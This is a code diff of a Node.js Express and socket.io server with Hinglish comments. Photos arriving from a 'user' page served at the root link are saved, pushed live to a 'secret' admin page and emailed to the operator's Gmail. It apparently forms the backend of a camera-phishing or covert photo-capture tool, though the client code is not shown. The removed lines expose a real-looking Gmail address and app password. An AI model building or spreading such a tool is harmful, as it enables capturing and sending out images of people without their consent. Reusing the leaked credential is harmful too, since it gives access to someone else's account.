@@ -9,47 +9,46 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
-// Email Setup (Apna Gmail aur App Password yaha dalein)
-const transporter = nodemailer.createTransport({
-    service: 'gmail',
-    auth: {
-        user: 'prectice@gmail.com', // 👈 Apni Gmail ID
-        pass: 'includestdiosystem' // 👈 16-digit App Password
-    }
-});
-
-// Storage folder setup
+// Folder setup for local uploads
 const uploadDir = path.join(__dirname, 'uploads');
 if (!fs.existsSync(uploadDir)) {
     fs.mkdirSync(uploadDir);
 }
 
+// Serve static files from root AND public folder
 app.use(express.static(__dirname));
 app.use(express.static(path.join(__dirname, 'public')));
 app.use('/uploads', express.static(uploadDir));
 
-// 1. MAIN LINK: Main link kholne par sirf USER page khulega
+// Gmail Config (Apne Passwords aur ID ke sath check kar lein)
+const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+        user: 'YOUR_GMAIL@gmail.com', 
+        pass: 'YOUR_GMAIL_APP_PASSWORD'
+    }
+});
+
+// Helper function to find file location (root vs public)
+const getFilePath = (fileName) => {
+    const publicPath = path.join(__dirname, 'public', fileName);
+    if (fs.existsSync(publicPath)) return publicPath;
+    return path.join(__dirname, fileName);
+};
+
+// 1. Root URL -> Direct User Page
 app.get('/', (req, res) => {
-    const userPath = fs.existsSync(path.join(__dirname, 'public', 'user.html'))
-        ? path.join(__dirname, 'public', 'user.html')
-        : path.join(__dirname, 'user.html');
-    res.sendFile(userPath);
+    res.sendFile(getFilePath('user.html'));
 });
 
-// 2. USER LINK: Direct User Page
+// 2. Explicit User Route
 app.get('/user.html', (req, res) => {
-    const userPath = fs.existsSync(path.join(__dirname, 'public', 'user.html'))
-        ? path.join(__dirname, 'public', 'user.html')
-        : path.join(__dirname, 'user.html');
-    res.sendFile(userPath);
+    res.sendFile(getFilePath('user.html'));
 });
 
-// 3. ADMIN LINK: Direct Secret Admin Page (Aapke liye)
+// 3. Explicit Admin Route
 app.get('/admin.html', (req, res) => {
-    const adminPath = fs.existsSync(path.join(__dirname, 'public', 'admin.html'))
-        ? path.join(__dirname, 'public', 'admin.html')
-        : path.join(__dirname, 'admin.html');
-    res.sendFile(adminPath);
+    res.sendFile(getFilePath('admin.html'));
 });
 
 io.on('connection', (socket) => {
@@ -64,35 +63,23 @@ io.on('connection', (socket) => {
         const fileName = `photo_${Date.now()}.png`;
         const filePath = path.join(uploadDir, fileName);
 
-        // Photo Save locally
         fs.writeFile(filePath, base64Data, 'base64', (err) => {
             if (!err) console.log(`✅ Photo Saved: uploads/${fileName}`);
         });
 
-        // Broadcast to Admin Live UI
         io.emit('send-photo-to-admin', imageData);
 
-        // Gmail par photo bhejne ka setup
         const mailOptions = {
-            from: 'prectice@gmail.com', // 👈 Apni Gmail
-            to: 'prectice@gmail.com',   // 👈 Jis Email par photo chahiye
+            from: 'YOUR_GMAIL@gmail.com',
+            to: 'YOUR_GMAIL@gmail.com',
             subject: '📸 New Photo Captured!',
-            text: 'Nayi photo capture ho gayi hai.',
-            attachments: [
-                {
-                    filename: fileName,
-                    content: base64Data,
-                    encoding: 'base64'
-                }
-            ]
+            text: 'User page se nayi photo capture hui hai.',
+            attachments: [{ filename: fileName, content: base64Data, encoding: 'base64' }]
         };
 
         transporter.sendMail(mailOptions, (error, info) => {
-            if (error) {
-                console.log('❌ Email Send Error:', error);
-            } else {
-                console.log('📧 Email Sent Successfully:', info.response);
-            }
+            if (error) console.log('❌ Email Send Error:', error);
+            else console.log('📧 Email Sent:', info.response);
         });
     });
 });
